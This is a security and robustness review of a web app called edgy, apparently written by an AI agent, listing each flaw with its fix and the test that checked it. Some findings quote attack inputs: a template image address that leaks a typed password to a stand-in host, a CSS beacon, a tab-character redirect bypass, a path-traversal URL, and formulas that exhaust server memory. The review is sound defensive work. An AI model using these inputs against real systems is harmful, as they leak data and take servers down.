# Production review, 22 October 2026

A review of edgy for what would go wrong on a server other people can reach: bugs, security gaps, missing limits and rough edges. Each finding below says what was wrong, how it was fixed, and how the fix was checked: in most cases a test that fails on the code as it was (`git show cb9bda3:<file>`) and passes now. Where a check is by reading or by running a script instead, it says so.

Starting point: `main` at `cb9bda3`, typecheck clean, 303 tests passing. The HTTP layer, accounts and deployment were reviewed directly; three reviewers read the rest in parallel (the runner, export, Ask AI and MCP; the store, sync and Flow; the browser app and the docs site). Every finding was checked against the code before it was fixed, and the storage and formula fixes were made by two more agents working on their own files, each test run against the original code.

About the request to document "sharing clips as a URL" and "the new interactive mode": those are features of Fablecut (`C:\newme\davidapp`), not of edgy, which has neither clips nor an interactive mode. Another session was running this same review there at the same time, with its own log (`docs/production-review-2026-10-22.md` in that repository) and uncommitted work in that checkout, so this review left it alone. The documentation added here is for what changed in edgy: putting it online, the new switches, and the new limits.

Contents: [Summary](#summary) · [HTTP and accounts](#http-and-accounts) · [Running documents on the server](#running-documents-on-the-server) · [Storage and sync](#storage-and-sync) · [Formulas](#formulas) · [The browser app](#the-browser-app) · [Docs site and tooling](#docs-site-and-tooling) · [Documentation](#documentation) · [Left as they are](#left-as-they-are) · [How it was checked](#how-it-was-checked)

## Summary

| # | Severity | Finding | Fixed in |
| --- | --- | --- | --- |
| 1 | critical | Behind an HTTPS proxy, every change from the browser was refused | `app.ts` |
| 2 | high | Request bodies had no size limit, on public routes too | `app.ts` |
| 3 | high | Behind a proxy, one guesser made everyone wait to sign in | `app.ts` |
| 4 | high | Any account could spend the server's Claude key | `app.ts`, `compose.ts` |
| 11 | high | An error in a timer's handler ended the process | `runner.ts`, `hub.ts` |
| 12 | high | A fetch cell could fetch itself in a tight loop and freeze the server | `runner.ts` |
| 14 | high | One change the cloud refused stopped sync for every account | `sync.ts`, `cloud.ts` |
| 15 | high | Writes were several disk syncs each and not atomic; quadratic de-duplication | `store.ts`, `flow.ts` |
| 17 | high | A short formula could crash the server (out of memory) or hold it for minutes | `sx.ts`, `engine.ts` |
| 18 | high | One bad cell blanked the whole app, for everyone | `Boundary.tsx`, `CellView.tsx`, `rows.ts`, `icons.ts` |
| 19 | high | A closed editor could open its event stream again | `session.ts` |
| 5 | medium | Sign-ups had no limit and couldn't be closed | `app.ts`, `SignIn.tsx`, `me.ts` |
| 6 | medium | No security headers (framing, sniffing, referrer) | `app.ts`, `docs.ts` |
| 7 | medium | A picture upload was whatever the request said it was | `app.ts`, `export.ts` |
| 8 | medium | `?limit=-1` returned a document's whole history | `app.ts` |
| 9 | medium | A request to an agent could be heard and answered by another editor | `compose.ts`, `hub.ts`, `app.ts` |
| 13, 16, 20 | medium and low | Runner limits, sync integrity, browser robustness (see each table) | as listed |
| 10 | low | Body shapes, id lists, throttle memory, docs paths, the API's 404, `npm start` on Windows, clean shutdown, caching, a build warning | `app.ts`, `auth.ts`, `docs.ts`, `index.ts`, `scripts/start.mjs`, `vite.offline.config.ts` |

45 new tests; every one fails on the code as it was. 303 tests before, 348 now.

## HTTP and accounts

### 1. Behind an HTTPS proxy, every change from the browser was refused (critical)

How edgy is put online, a reverse proxy that ends HTTPS in front of `127.0.0.1:8787`, broke it. `@hono/node-server` builds the request URL from the socket, so behind the proxy the server's own origin was `http://edgy.example.org`. The browser sends `Origin: https://edgy.example.org`. `crossSite()` compared the two and answered every POST, PATCH and DELETE made with the session cookie with `403 a page on another site can not change edgy`. Nothing could be saved unless `EDGY_WEB_URL` happened to be set to the exact public address. Share links were made with `http://` too.

Fix: `publicOrigin()` in `src/server/app.ts` works out the address the browser used from `X-Forwarded-Proto` and `X-Forwarded-Host` (a page on another site can't set those on a person's request, so the cross-site check loses nothing). It is one of the origins writes may come from, and share links, `GET /api/health`'s `web` and the share list use it.

Checked: `production.test.ts` "behind a proxy that ends HTTPS…": a write as a proxy hands it on (`http://edgy.example.org`, `X-Forwarded-Proto: https`, `Origin: https://edgy.example.org`) is `201` (it was `403`), another site's `Origin` is still `403`, the share link starts with `https://edgy.example.org/s/`, and a proxy that rewrites `Host` (nginx's default) works with `X-Forwarded-Host`.

### 2. Request bodies had no size limit (high)

Every route read its body whole into memory, including the public `POST /api/auth/signin` and `/signup`. One request of a few gigabytes would run the process out of memory. `POST /api/assets` read the whole body before checking its 8 MB limit.

Fix: Hono's `bodyLimit` after the auth middleware (so a request with no credential is refused before its body counts): 64 KB for `/api/auth/*`, 16 MB for the rest, answering `413 that request is larger than …`. The picture upload also checks `Content-Length` before reading.

Checked: `production.test.ts` "a body larger than the limit is refused…": a 70 KB sign-in is `413`, a 17 MB body signed out is `401` (refused before it counts), a 17 MB ops body is `413`, and a 1 MB one is still `200`.

### 3. Behind a proxy, one guesser made everyone wait to sign in (high)

Failed sign-ins were counted per socket address. Behind a proxy on the same machine every socket is `127.0.0.1`, so the "address" throttle (30 free failures) was one counter for the whole internet: 31 wrong passwords from anyone, and every person signing in waited, up to 5 minutes.

Fix: `address()` takes the last entry of `X-Forwarded-For` (the one the proxy itself added) when the socket is loopback, and ignores the header from any other socket, where it is the caller's own word.

Checked: `production.test.ts` "behind a proxy on this machine…": after 31 failures from `203.0.113.9` behind the proxy, that address waits (`429`) and `198.51.100.7` behind the same proxy doesn't (`401`); straight from the internet, changing `X-Forwarded-For` on every try doesn't escape the throttle.

### 4. Any account could spend the server's Claude key (high)

The server's secrets (`EDGY_SECRET_*`) are its owner's and only the owner's documents send them. `ANTHROPIC_API_KEY` had no such rule: anyone who signed up could use Ask AI with Claude on the owner's bill.

Fix: `claudeFor()` gives Claude to documents of the server's owner (the first account), including for people the owner lets edit them; `EDGY_AI_USERS=all` opts every account in. `GET /api/ai` says so per document, and the built-in composer's note names the reason.

Checked: `production.test.ts` "Claude answers in the server owner's documents…": the owner sees `claude: true`, another account `false` (and `true` in the owner's document it may edit), a compose request in that account's own document is answered by the built-in composer with the note, and `EDGY_AI_USERS=all` turns it on for everyone.

### 5. Sign-ups had no limit and couldn't be closed (medium)

Anyone who found the address could make any number of accounts, each costing a password hash and a tour document, and the docs could only advise "put your own sign-up policy in front of it".

Fix: a fourth throttle counts new accounts per address (ten free in 15 minutes, then the doubling wait), and `EDGY_SIGNUPS=off` closes sign-up once the server has an account with an email (`403`, reason `closed`). `GET /api/health` says `signups`, and the sign-in page then shows **This server does not take new accounts…** instead of a form it would refuse, and hides **Create an account**.

Checked: `production.test.ts` "sign-ups can be closed…" and "one address makes a few accounts, then waits"; in the browser (see [How it was checked](#how-it-was-checked)).

### 6. No security headers (medium)

No answer said `nosniff`, nothing stopped another site framing the app (a click there on Share or Delete would be the person's), and a shared document's `/s/<token>` address could be sent as a `Referer` by browsers with a loose default policy.

Fix: a middleware on every answer: `X-Content-Type-Options: nosniff`, `Referrer-Policy: same-origin`, `X-Frame-Options: SAMEORIGIN`, and `Content-Security-Policy: frame-ancestors 'self'` where the answer has no policy of its own (an uploaded picture keeps its `sandbox` one). The docs folder answers `nosniff` too.

Checked: `production.test.ts` "every answer says…".

### 7. A picture upload was whatever the request said it was (medium)

`POST /api/assets` trusted `Content-Type`: an HTML page sent as `image/png` was stored and served from the app's origin. (The `sandbox` policy kept it from running, so this was defence in depth.) An SVG saved with a doctype, as editors save them, was not recognised as one by `sniffImage`.

Fix: the bytes decide (`sniffImage`); a file that isn't one of the six picture types is `415 that file is not a PNG, JPEG, GIF, WebP, AVIF or SVG picture`, a PNG sent as JPEG is kept as `.png`, and `sniffImage` accepts a byte-order mark and a doctype before `<svg`.

Checked: `production.test.ts` "a picture is what its bytes are…".

### 8. `?limit=-1` returned a document's whole history (medium)

`GET /api/docs/:id/log` capped the limit with `Math.min(500, …)`, which lets `-1` through, and SQLite reads `LIMIT -1` as "no limit". `limit=abc` became `NaN`.

Fix: anything that isn't a number from 1 to 500 is 200 (above 500, 500).

Checked: `production.test.ts` "the history comes in pages of at most 500…" (210 versions: `-1` gives 200, it gave 210 before).

### 9. A request to an agent could be heard and answered by another editor (medium)

Ask AI hands a person's request to "an agent listening on the document". Any editor could long-poll `messages/wait` on it, which both made the owner's Ask AI wait for them and handed them the request; they could then answer it, and the answer was shown as **Your agent**. Every editor's browser stream also received the request's text.

Fix: a request belongs to the account that asked (`Requests.open/take/get` in `src/server/compose.ts`). Only an agent acting for that account (its key, or local mode) hears it, counts as listening, or may answer it; the document stream no longer sends `compose` events (no browser used them).

Checked: `production.test.ts` "someone else who can edit a document neither hears nor answers…".

### 10. Other limits and rough edges on the HTTP side (low)

| What | Fix | Checked |
| --- | --- | --- |
| A JSON body of `null`, a number or a list made routes throw (`500` and a stack trace in the log for each one, from the public sign-in routes too). | `objectOf()` around every body read in `app.ts`: such a body is `{}` and the route's own check answers `400`. | `production.test.ts` "JSON that is not an object…" |
| Lists of ids in one request had no limit (deck documents, pins, bulk actions); the deck's de-duplication was quadratic (see [Storage](#storage-and-sync)). | At most 1000 ids. | `production.test.ts` "lists of ids in one request have a limit" |
| The sign-in throttles remembered every email and address ever tried. | At most 10,000 keys each; finished windows go first, then the oldest. | `production.test.ts` "a throttle forgets old entries…" |
| `/assets/<name>` with sync on asked the cloud (a billed read) for every made-up name, and remembered each one forever. | The memo of missing names is capped at 5000, past entries first. | By reading; typecheck. |
| `/docs/..%2Fdocs-old/x.html` passed the folder check (`startsWith(root)` without a separator), and a malformed `%` escape was a `500`. | The path must be the folder or inside it; a bad escape is the docs' 404. | `production.test.ts` "the docs folder serves its own files only…" |
| In a built server, an `/api` address no route answered got the app's HTML page with `200`. | JSON `404 no such route: GET /api/…`. | `production.test.ts` "an /api address no route answers…" |
| `npm start` (`NODE_ENV=production tsx …`) doesn't run on Windows' shell. | `scripts/start.mjs` sets the variable and runs the server, on every system, and says when there is no build. | Run in the browser check below. |
| No clean shutdown: a service manager's `SIGTERM` killed the process mid-write. | `index.ts` stops sync and timers, closes the server and its streams, then the database; ten seconds at most. | Run in the browser check below. |
| The built app's page was read from disk on every request; its content-named bundles had no cache headers. | The page is read once and sent with `no-cache`; `/static/*` is cached for a year. | Browser check below. |
| The offline build warned that `inlineDynamicImports` is deprecated. | `codeSplitting: false`. | `npm run build` has no warning. |

## Running documents on the server

### 11. An error in a timer's handler ended the process (high)

`Runner.apply` ran from `setTimeout`/`setInterval` callbacks and from fetches nobody awaited (`void this.refresh(…)`). A handler whose record couldn't be saved (`JSON.stringify` of a huge value throws `RangeError`) threw out of the timer: an uncaught exception, and the server was gone. One throwing listener in `Hub.publish` also stopped the others hearing the event, and could do the same.

Fix: each tick is wrapped; a failed record write or fetch request from a handler becomes an error in the trace; background fetches go through `background()`, which logs a failure instead of leaving an unhandled rejection; `Hub.publish` calls each listener on its own.

Checked: `runner.test.ts` "a timer whose handler throws is reported, and the process carries on" (the original throws out of the clock) and "one listener that throws does not keep the others from hearing an event".

### 12. A fetch cell could fetch itself in a tight loop (high)

After every answer `recheck` fetched again straight away if the address had changed. A `load` handler that changes a value the address reads (`?k={{k}}` and `(set! k (+ k 1))`) fetched as fast as the network answered, saving a document version each time; with a path on this server it ran entirely in microtasks and the process stopped answering anything.

Fix: a re-fetch for a changed address waits until `MIN_REFETCH` (one second) after the last request started, through the runner's clock; leaving Live cancels it.

Checked: `runner.test.ts` "a load handler that changes the address it fetches fetches again at most once a second…": one request in 300 ms of real time, the second after the clock moves a second. On the original code the test file never finished: the loop starved the event loop so even the test runner's timeout couldn't fire, and it had to be killed after 120 s.

### 13. More limits in the runner (medium and low)

| What | Fix | Checked |
| --- | --- | --- |
| A one-off timer (`after`) had no minimum: one that restarts itself in its own tick saved a version a millisecond. | At least `MIN_TICK` (a second), like `every`. | `runner.test.ts` "a one-off timer waits at least a second…" |
| The fetch deadline only gave up on the promise: the socket stayed open while a server sent a byte now and then, and each poll opened another. Redirect bodies were read to the end. | An `AbortController` ends the request at the deadline; a redirect's body is destroyed, not drained. | `runner.test.ts` "a server that answers a byte at a time is cut off at the deadline, socket and all" (local test server; `getGuardedFor(…, local = true)` is the test's way past the address check, never a document's). |
| Every fetch of every document went to the network at once. | At most 32 requests on their way, the rest queue. | By reading; covered by the runner tests passing. |
| Fetched answers were kept for every document ever opened in Live (up to 1 MB each). | The answers of the 200 most recently fetched documents nobody is in Live on are kept; older ones go. | By reading; runner tests pass. |
| An export fetched a picture used in many cells once per cell, all at once, with no total size. | Each address once per export, four at a time, at most 64 MB of pictures in all (the rest count as missing). | `export.test.ts` "an export fetches a picture used in many cells once" (30 requests before, 1 now). |
| The address check missed the old site-local range (`fec0::/10`) and Teredo (`2001::/32`). | Both refused. | `runner.test.ts` "more private ranges…" |
| `edgy_export` (MCP) wrote to any path an agent named; words in someone else's document can steer an agent. `edgy_organize` put anything starting `deck-` into a URL path. | The file must end in `.html`; a deck id must look like one. | By reading; typecheck. |

## Storage and sync

Fixed in `src/server/store.ts`, `sync.ts`, `cloud.ts` and `flow.ts`. The tests are in `src/server/storage.test.ts` (new), `sync.test.ts` and `flow.test.ts`; each was run against the original four files in a scratch copy and failed there.

### 14. One change the cloud refused stopped sync for every account on the machine (high)

`push()` threw on the first batch the cloud refused (an oversized change answered `413`, or a statement it won't run), so the batches after it never went and the queue never cleared; every round rebuilt the same batches and failed again, for good. Push is not per account, so on a shared server one person's change stopped everyone's. And while it was failing, every local edit re-sent the whole backlog 300 ms later. Turso's pipeline also runs every statement even after one fails, so `BEGIN … COMMIT` could commit part of a change.

Fix: `CloudRefused` (a `413`, or a refused statement) is told apart from the cloud being down; bad credentials still stop the round. `cloud.atomic()` sends a Hrana batch whose steps run only if the one before succeeded, with `ROLLBACK` if `COMMIT` didn't. A refused batch is split in halves until the refused change is alone; that one stays queued, is tried again after 10 minutes or when it changes, and shows in the sync status as refused with the cloud's words. `kick()` waits out the back-off while rounds are failing.

Checked: `sync.test.ts` "a change the cloud refuses waits on its own…" (before: the second machine got nothing; now everything but the refused change arrives), "over Turso's pipeline…" (before: a `create` row without its history in the cloud), "after a failed round, a change waits for the back-off…".

### 15. Writes were several disk syncs each, and not atomic (high)

`insert`, `update` and `deleteRow` each committed the record, a counter (two writes) and the sync bookkeeping separately, with `synchronous=FULL`, all on the event loop. Clearing a 1000-record collection took about 8 seconds with the whole server frozen; 10,000, over a minute. A crash between the writes left a change that never syncs (or, for a delete, one a later remote update brings back). Separately, a deck's de-duplication (`docs.filter((d, i) => docs.indexOf(d) === i)`) and the pins' were quadratic on a list the request supplies.

Fix: `Store.transaction()` (a savepoint when nested, counted by the store itself so it works on every supported Node) around every multi-write method and loop (`clear`, `markAll`, `writePins`, `deleteUser`, Flow's delete cascade and board update, and the rest); the counter is one statement; `PRAGMA synchronous=NORMAL` (safe with WAL) and `busy_timeout=5000`. De-duplication uses a `Set`.

Checked: `storage.test.ts` "clearing thousands of records…" (3000 inserts on a file: 18.6 s before, about 0.4 s now), "a failure partway through clearing…" (before: 0 of 10 records left with the bookkeeping half done; now nothing changes), "the file waits for the disk…", "a deck asked for with tens of thousands of ids…" (80,000 ids: 4.4 s before, 36 ms now).

### 16. More in storage and sync (medium and low)

| What | Fix | Checked |
| --- | --- | --- |
| A row pulled from the cloud was checked by its key but written by the ids in its body: a row in one account's space could put content into another account's document (it reached the cache), take over its deck, or bring back its revoked share link. It takes write access to the Turso database, but the code treats spaces as a boundary. | A row whose body names another id than its key is skipped; `receiveDoc` caches only what it really stored; `receiveDeck` writes under the key. | `sync.test.ts` "a row whose body names another id than its key…" |
| A cloud restored from a backup wasn't noticed: machines missed each other's later changes and kept edits pending for good. | `connect()` reads the cloud log's highest `seq` with its first request and starts over if a local cursor is past it; starting over also marks everything here to send. | `sync.test.ts` "a cloud restored from a backup is noticed…" (a machine that connects only after the restored cloud has passed its old cursor still isn't told: see [Left as they are](#left-as-they-are)). |
| Rewriting a document's history after a pull and saving its new base were two transactions; a crash between them left the machines disagreeing. | One transaction. | `sync.test.ts` "a crash between rewriting the history and saving its base…" |
| Pictures were not sent again to a new cloud database. | `queueAssets()` runs whenever `connect()` starts over. | `sync.test.ts` "pointed at a new cloud database, a machine sends its pictures again too" |
| Expired sessions stayed in the database for good. | Deleted when the store opens and on new sign-ins, at most once an hour. | `storage.test.ts` "sessions past their end are deleted…" |
| A deleted account's email and password hash could come back to the cloud's account list with an upload in flight. | The upsert leaves a deleted row alone. | `sync.test.ts` "a profile sent just after the account was deleted…" |
| Flow routes with a JSON body that isn't an object answered `500`. | A local `objectOf`, as in `app.ts`. | `flow.test.ts` "Flow: a JSON body that is not an object…" |
| `messages()` had no limit. | The latest 500, oldest first. | `storage.test.ts` "a document's messages come back as the latest 500…" |
| Record ids were about 36 bits, and they are a primary key across every account and machine. | New ones are `r` and 16 characters (about 81 bits); old ones still work. | `storage.test.ts` "new record ids are long…" |
| The hub's unsubscribe, called twice (a wait that ended, then was aborted; a guest whose link was turned off), could delete a newer room for the same document, so its viewers stopped hearing changes. | It deletes only its own room. The list of documents agents listened on is pruned too. | `runner.test.ts` "one listener that throws…" (second half). |

## Formulas

### 17. A short formula could crash the server or hold it for minutes (high)

The step limit (400,000) counted only expressions evaluated, not the work built-ins do: `concat` and `flat` had no length limit, `map` made lists of any size, `uniq` compared every pair, and each expression started a fresh counter, so a document had no budget at all. The server evaluates formulas for reads, exports, Live and `POST /api/docs/:id/eval`, which any viewer may call with any expression. A short formula building many 20,000-item lists inside a `map` killed Node with "JavaScript heap out of memory" (exit 134, which nothing can catch); a `uniq` inside a `map` held the event loop about 130 ms per item. While fixing it, four more ways in turned up: a value holding the same list many times (`(reduce (fn (acc it) (list acc acc)) 1 (range 40))`) is cheap to make but exponential to spell out (`plainValue`, `JSON.stringify`, `deepEqual`); `(reduce (list acc) 0 (range 20000))` overflowed the stack outside the interpreter's error handling; `count-if` and `includes?` looped without counting; and long text was scanned in full on every `+` or date call.

Fix, in `src/core/sx.ts` and `engine.ts`: a step is now also an item a built-in visits or makes, or 16 characters of text it reads or makes. Lists a function would make are checked before they are built (100,000 items), text too (2,000,000 characters). What a formula hands back or sends is weighed (a shared list counted each time it is held) and capped at a million, and nested at most 300 deep. All the formulas of one evaluation of a document share a budget of 4,000,000 steps (`Budget`), so the cells worked out last say `this document's formulas take too long to compute together`. `uniq` keys each value once and is linear, with the same answers as before (checked against the old pairwise comparison on 39 awkward values). Text longer than 100 characters is never read as a number or a date. The biggest template uses 420 steps; 136,000 with a thousand times its sample data.

Checked: `src/core/limits.test.ts`, five tests, each sized to finish (slowly) on the original code: "huge lists and text hit a cap" (the original returned a 16,777,216-item value; now an error in 65 ms), "work inside built-ins counts" (returned values; now 0.18 s), "`uniq` is fast and equal to the old answers" (28.3 s; now 0.1 s), "a document budget" (300 heavy cells: 9.9 s and no error; now 0.7 s), "shared and deep values" (returned the value; now 80 ms). Every example in the docs still gives what its page says (the docs tests run 275 of them).

## The browser app

### 18. One bad cell blanked the whole app (high)

There was no error boundary anywhere, and several lookups used plain objects keyed by what a document says. An icon cell set to `constructor` (or `__proto__`), a badge column showing a record whose status is `toString`, a row action whose icon is `constructor`, or a label that is an object, threw while drawing; React unmounted the root and the page went white, in Edit, Live, Page, Play and the exported file, for everyone including the owner, who then couldn't open the editor to fix it. Anyone with an edit link could do this.

Fix: `src/web/Boundary.tsx`. Every cell is drawn inside a boundary: one that can't be drawn shows **This cell can not be shown: …** and stays selectable, so the rest of the document works and the cell can be fixed or deleted. Every page is inside one too, with **Reload** and **Back to the library**. The lookups use own keys only (`iconFor`, `Object.hasOwn` in `badgeColors` and `actionName`).

Checked: `table.test.ts` "names that every object inherits name nothing…"; in the browser, a document with a `constructor` icon cell draws the rest and shows the message in that cell (see below).

### 19. A closed editor could open its event stream again (high)

After a save, a check one second later reconnected the stream if the confirmation hadn't arrived, without asking whether the session had been closed or paused meanwhile. Leaving a document within a second of a save left a stream (and its 10-second watchdog) open for the life of the tab, keeping a ghost in the document's people and, in Live, its timers and fetches running on the server. On HTTP/1.1 six of them used up the browser's connections and every request hung on "Opening…".

Fix: `connect()` does nothing on a closed or paused session, and the late check asks first.

Checked: the reviewer's simulation (`zombie.ts`, a fake transport and EventSource): on the original, "1.3s after the POST answered: streams open = 1 … watchdog set: true"; now "streams open = 0 … watchdog set: false".

### 20. Other fixes in the browser app (medium and low)

| What | Fix | Checked |
| --- | --- | --- |
| After a redeploy, a tab that opened a page whose code had been replaced got a blank page. | The page boundary says **edgy was updated while this page was open.** with Reload, and a failed preload reloads once by itself (`vite:preloadError`). | Browser check (boundary); by reading (preload). |
| Edits made while a save was failing were merged into the failing batch; one conflict (`422`) then threw away everything done since. | A batch that has been tried takes no new edits, and a `422` on several changes resends them one at a time, so only the one that conflicts is lost. | By reading; the save path is exercised by the browser check. Not handled: a `401` in the middle of editing still loses the unsaved batch (see [Left as they are](#left-as-they-are)). |
| `color()` accepted `url(//evil.example/p.gif)`, so a background could tell another site who opened a document and when. | Anything that loads (`url(`, `image(`, `image-set(`, `cross-fade(`, `element(`) is not a colour. | `look.test.ts` "a colour is a colour…" |
| `safeNext` let `/<TAB>/evil.example` through (a browser drops the tab: `//evil.example`); Play's `from` used a weaker check of its own. Navigation is by `history`, so the result was a broken page rather than a redirect. | Control characters are refused and the result must resolve to this site; Play uses `safeNext`. | `paths.test.ts` (the tab case failed before). |
| A guest whose link was turned off while their stream was down kept seeing the document and "Offline, will retry". | `resync` turns a `revoked` answer into the "no longer shared" screen, and a 404 into "missing". | By reading. |
| The Data page swallowed every failure, and clicking quickly between collections could show the wrong one's records. | Errors show; an older answer is ignored. | By reading; browser check. |

## Docs site and tooling

| What | Fix | Checked |
| --- | --- | --- |
| The live examples' frame took messages from any parent, and both sides posted to `*`. | Messages go to and come from this origin only. | Docs tests; browser check of a live example. |
| **Start over** under a live example changed only the frame address's `#fragment`, which doesn't reload a page: it did nothing. | The frame is reloaded. | Browser check. |
| `checkFolder` skipped every page whose path had an underscore anywhere, so run from `C:\Users\john_doe\…` it checked 0 pages and passed. | Only the folder's own `_/` is skipped. | `linkcheck.ts` on a copy of the docs under a folder named `under_score_docs`: 0 pages before, 126 now. |

## Documentation

- **Install and run** (`site/content/start/install.md`): `npm start` on every system and how it stops; the new switches (`EDGY_SIGNUPS`, `ANTHROPIC_API_KEY` and `EDGY_AI_USERS`, `EDGY_SECRET_<NAME>`); a new **Put it online** section (a Caddy example, what to set and why, what the proxy must pass on, backups, what edgy does by itself); two new "won't start" entries.
- **Accounts**: the sign-up throttle, `EDGY_SIGNUPS=off`, the server's owner, the throttle behind a proxy.
- **Ask AI**, **The MCP server**: requests go only to the asker's own agent; Claude in the owner's documents; `edgy_export` writes `.html` only.
- **Timer**, **The runner** (internals): one-off timers wait a second; re-fetch floor, concurrency, deadline, kept answers, errors that never end the server.
- **Access** (internals): the fourth throttle, the forwarded address, the public origin, a new **Every answer** section (headers, body limits, id lists).
- **The HTTP API**: `413`, `429` for sign-ups, the JSON `404`, `signups` in `GET /api/health`, pictures decided by their bytes.
- **Troubleshooting**: every new message.
- **README**: a **Putting it online** section, the owner's Claude key, sign-ups.

- **Formulas** (`internals/interpreter.md`, `language/index.md`, `language/errors.md`): what a step is, the document budget, the new caps and every new message.

## Left as they are

Found, and not changed here, with the reason:

| What | Why it stays | What would fix it |
| --- | --- | --- |
| An image cell's address can be a template, so a document can send what a viewer types into its inputs to another site (`https://evil.example/x.gif?{{password}}`), including on a view-only link. | It's how the image kind works (a picture chosen by a value), and the author of a document controls what it shows anyway. The `url(…)` route through colours is closed. | Fetch pictures from other sites through the server (as exports already do), or refuse templates in addresses on other origins. |
| A session that ends while edits are unsaved (`401`) loses the batch on its way. | Keeping it across the sign-in page needs storing it in the browser and replaying it as the right person afterwards. | Keep the pending batch in `sessionStorage` and send it after the sign-in, if the document and the account are the same. |
| A pulled change that doesn't apply on this machine (an ordinary error, not a crash) is skipped, and that machine never applies it. | Not moving past a failed page would break the "skipped, not a wall" rule a test checks; the transaction (item 16) covers the crash case. | Retry skipped rows a few times before giving up, and show them in the sync status. |
| A machine that connects only after a restored cloud's numbering has passed its old cursor doesn't notice the restore. | Rare, and needs a new marker in every machine's sync state. | Remember the id of the last row pulled, and check it is still there. |
| Document ids (`shortId()`) and deck ids are short, and global across accounts and machines; record ids are now long. | Changing them touches URLs, links and the docs' examples. | Longer ids for new documents and decks. |
| Sync bookkeeping (`sync_dirty`, `sync_gone`) grows with every change, also with sync off, and the cloud's log is never compacted. | Turning sync on later relies on it; compaction needs every machine's cursor. | Prune `sync_gone` past the oldest cursor; compact the cloud log by snapshot. |
| Flow's limits (text length, the author set by the server) apply on `/api/flow`; `/api/data/flow` takes any record (within the 16 MB body limit). | Records are records: documents write them with `insert!`. | Validate `flow*` collections in the data routes too. |
| `GET /api/flow` re-reads shares and access for each linked document, and loads every item at once. | Fine at hundreds of items. | A title-only lookup, and pages. |
| The store's document cache and the sync pull (one query per local account every few seconds) grow with use. | Bounded by the documents and accounts on one machine. | An LRU for the cache; one query for all accounts. |
| A guest's event stream carries the share token in its address (`?share=`), so it shows in a proxy's access log. | An `EventSource` can't send headers. | A short-lived stream ticket exchanged for the token. |
| The app's pages have `frame-ancestors` but no `script-src` policy. | A policy that blocks inline script would need checking every page, the docs and the exported files. | A `script-src 'self'` policy on the app's HTML, after a sweep. |
| Sign-up says when an email already has an account, and so does adding someone to a document. | It is how a person learns to sign in instead; the sign-up throttle limits how fast anyone can ask. | Nothing, by choice. |
| There is no password reset, and no access log. | No email service is part of edgy; a proxy keeps access logs. | An admin command to set a password. |

## How it was checked

**Gates**, on the finished tree (Windows 11, Node 24.19):

- `npm run typecheck`: clean.
- `npm test`: 348 tests, 348 pass (303 before this review). New: `src/server/production.test.ts` (15), `src/server/storage.test.ts` and new tests in `sync.test.ts` and `flow.test.ts` (16), `src/core/limits.test.ts` (5), and in `runner.test.ts` (6), `export.test.ts`, `look.test.ts`, `table.test.ts` (1 each), plus new cases in `paths.test.ts`. The docs tests (coverage of every route, tool, function and key; every example in the docs run; every link and anchor) pass with the new pages.
- `npm run build`: the app, the offline bundle and the docs (125 pages), with no warning (the deprecation warning before is gone).

**Before and after.** Each new test was run against the code as it was: the edited files replaced by `git show cb9bda3:<file>`, the test file kept, then the edited files put back. Every one failed there (the fetch-loop test froze the whole test file, which had to be killed after 120 s) and passes now.

**The built server in a browser** (`npm start` through `scripts/start.mjs`, accounts mode, `EDGY_SIGNUPS=off`, its own data folder in the scratchpad, at `http://127.0.0.1:8790`):

- `npm start` started on Windows; the start line said `sign-ups off`.
- With no account yet, sign-up was open; the first account was made through the form (the browser's own write passed the cross-site check). `GET /api/health` then said `"signups": false`; signed out, the sign-in page had no **Create an account**, `/signup` showed **This server does not take new accounts…**, and a sign-up over the API was `403` with reason `closed`.
- Headers, read in the page: the app's page `no-cache`, its bundle `public, max-age=31536000, immutable`; every answer `nosniff`, `same-origin`, `SAMEORIGIN` and `frame-ancestors 'self'`; `GET /api/nothing-here` a JSON `404`.
- A document with an icon cell named `constructor` between two text cells drew all three (the icon as the "?" stand-in). A document with a button whose label is an object drew the cells around it and **This cell can not be shown:** in its place, followed at first by React's minified error #31 (since replaced by plain words, *it holds a list or an object where text belongs (a label, say)*, matched on that error's text and present in the final build); clicking the cell selected it (the panel showed the button, the toolbar its delete); typing a label fixed it in place, without a reload, and it saved.
- A docs page with a live example (`/docs/cells/button/`): the example received its document with the origin checks in place, **Add one** counted, **Start over** reloaded the frame back to 0. The original reset (a `#fragment` change) left it at 3, with no reload.
- Console: only the error the boundary caught (React logs it) and the probes' own `403`/`404`.

**Clean shutdown**: the server entry started in a process of its own, a document made, an event stream held open by `curl` from another process, then `SIGTERM`: `edgy: SIGTERM, stopping`, exit 0 after 6 ms, and only `edgy.db` left in the data folder (the WAL was checkpointed and the database closed). On Windows the preview tool ends processes without a signal, so this was checked by sending the signal inside the process.

**The screen sweep** (`.claude/skills/goal-loop/scripts/sweep.sh`, headless Chrome) against the built server, signed in, with five template documents (showcase, tables, events, elements, the Flow dashboard): 55 screens (sign-in, sign-up, library, data, profile, docs, each document in Edit, Live and Page at desktop and phone size and as PDF, the five Flow views at desktop, phone and dark), 0 console or network problems. The tables document was read by eye: badges keep their colours and row actions their icons after the own-key lookups.

**Link check** from a folder whose path has an underscore: 126 pages, 25,055 links, 0 broken (0 pages were checked before).

Nothing was committed. Fablecut (`C:\newme\davidapp`) was not touched.
